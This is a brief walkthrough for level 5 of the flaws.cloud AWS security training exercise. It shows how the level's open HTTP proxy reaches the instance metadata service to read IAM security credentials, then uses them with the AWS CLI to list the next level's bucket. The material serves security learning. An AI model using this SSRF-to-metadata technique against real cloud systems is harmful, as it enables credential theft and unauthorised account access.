level 5 has a simple HTTP proxy on it (only HTTP, not HTTPS)

using the proxy, you can exploit the metadata service at 169.254.169.254 (same for all cloud services)
You should have been able to find your way from
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/
to
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/

which lists the security credentials for level 6.
you can add a profile to your AWS CLI and use that to list the contents of level 6

aws --profile level5 s3 ls level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud

Note that you need to specify the aws_session_token in your ~/.aws/credentials file or you will get an InvalidAccessKeyId error
